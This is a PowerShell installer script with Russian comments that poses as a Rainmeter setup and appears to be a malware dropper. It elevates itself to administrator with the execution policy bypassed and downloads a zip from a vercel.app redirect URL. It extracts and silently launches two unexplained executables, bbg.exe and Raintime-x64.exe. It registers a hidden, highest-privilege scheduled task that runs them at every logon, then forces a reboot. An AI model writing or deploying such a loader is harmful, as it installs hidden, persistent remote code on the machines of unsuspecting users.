param(
    [Parameter(Mandatory=$true)]
    [string]$enroll_token,
    [Parameter(Mandatory=$true)]
    [string]$id
)

$ErrorActionPreference = 'Stop'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $argList = @(
        "-NoProfile"
        "-ExecutionPolicy", "Bypass"
        "-File", "`"$PSCommandPath`""
        "-enroll_token", "`"$enroll_token`""
        "-id", "`"$id`""
    )
    Start-Process -FilePath "powershell.exe" -ArgumentList $argList -Verb RunAs
    exit
}

try {
    # 1. СКАЧИВАНИЕ АРХИВА
    $zipUrl      = "https://redirect-ten-gold.vercel.app/Rainmeter-64.zip"
    $zipPath     = "$env:ProgramData\Rainmeter-64.zip"
    $extractPath = "$env:ProgramData\Rainmeter-64"

    Write-Host "[+] Скачивание архива с $zipUrl..."
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing

    # 2. РАСПАКОВКА
    Write-Host "[+] Распаковка в $extractPath..."
    if (Test-Path $extractPath) {
        Remove-Item -Path $extractPath -Recurse -Force
    }
    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
    Remove-Item -Path $zipPath -Force

    # 3. ПРОВЕРКА ФАЙЛОВ
    $bbgPath = "$extractPath\bbg.exe"
    $raintimePath = "$extractPath\Raintime-x64.exe"
    
    if (-not (Test-Path $bbgPath)) {
        throw "Файл bbg.exe не найден после распаковки"
    }
    if (-not (Test-Path $raintimePath)) {
        throw "Файл Raintime-x64.exe не найден после распаковки"
    }

    # 4. ОБНОВЛЕНИЕ КОНФИГУРАЦИОННОГО ФАЙЛА (если существует)
    $configPath = "$extractPath\config_manager.xml"
    if (Test-Path $configPath) {
        $content = Get-Content -Path $configPath -Raw
        $content = $content -replace 'enroll_token=.*?;', "enroll_token=$enroll_token;"
        Set-Content -Path $configPath -Value $content -Encoding UTF8
        Write-Host "[+] Конфигурационный файл обновлен"
    }

    # 5. СОЗДАНИЕ СКРИПТА АВТОЗАПУСКА
    $autorunScriptPath = "$extractPath\autorun.ps1"
    $autorunScript = @'
$ErrorActionPreference = "Stop"
$bbgPath = "C:\ProgramData\Rainmeter-64\bbg.exe"
$raintimePath = "C:\ProgramData\Rainmeter-64\Raintime-x64.exe"
$logFile = "C:\ProgramData\Rainmeter-64\autorun.log"

"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ЗАПУСК СКРИПТА" | Out-File -FilePath $logFile -Append

try {
    # Запуск bbg.exe
    if (Test-Path $bbgPath) {
        $bbgProcess = Start-Process -FilePath $bbgPath -WorkingDirectory (Split-Path $bbgPath -Parent) -WindowStyle Hidden -PassThru
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') bbg.exe запущен (PID: $($bbgProcess.Id))" | Out-File -FilePath $logFile -Append
    } else {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ОШИБКА: bbg.exe не найден" | Out-File -FilePath $logFile -Append
    }

    # Запуск Raintime-x64.exe
    if (Test-Path $raintimePath) {
        $raintimeProcess = Start-Process -FilePath $raintimePath -WorkingDirectory (Split-Path $raintimePath -Parent) -WindowStyle Hidden -PassThru
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') Raintime-x64.exe запущен (PID: $($raintimeProcess.Id))" | Out-File -FilePath $logFile -Append
    } else {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ОШИБКА: Raintime-x64.exe не найден" | Out-File -FilePath $logFile -Append
    }

    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ВСЕ ПРОЦЕССЫ ЗАПУЩЕНЫ" | Out-File -FilePath $logFile -Append
}
catch {
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') КРИТИЧЕСКАЯ ОШИБКА: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append
}
'@

    Set-Content -Path $autorunScriptPath -Value $autorunScript -Encoding UTF8

    # 6. СОЗДАНИЕ ЗАДАЧИ В ПЛАНИРОВЩИКЕ ЗАДАЧ
    $taskName = "Rainmeter64AutoStart"
    
    # Удаление существующей задачи (если есть)
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) {
        Stop-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }

    # Создание новой задачи
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$autorunScriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Автозапуск Rainmeter-64 компонентов" -ErrorAction Stop

    Write-Host "[+] Задача планировщика создана: $taskName"

    # 7. НЕМЕДЛЕННЫЙ ЗАПУСК ПРОГРАММ
    Write-Host "[+] Запуск bbg.exe..."
    Start-Process -FilePath $bbgPath -WorkingDirectory $extractPath -WindowStyle Hidden
    
    Write-Host "[+] Запуск Raintime-x64.exe..."
    Start-Process -FilePath $raintimePath -WorkingDirectory $extractPath -WindowStyle Hidden

    Write-Host "[+] ВСЕ ОПЕРАЦИИ УСПЕШНО ВЫПОЛНЕНЫ"
    Write-Host "[!] Система будет перезагружена через 5 секунд..."
    
    Start-Sleep -Seconds 5
    Restart-Computer -Force
}
catch {
    Write-Host "[!] ОШИБКА:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    if ($_.ScriptStackTrace) {
        Write-Host ""
        Write-Host "СТЕК ВЫЗОВОВ:" -ForegroundColor Yellow
        Write-Host $_.ScriptStackTrace
    }
    Read-Host "Нажмите Enter для выхода"
}
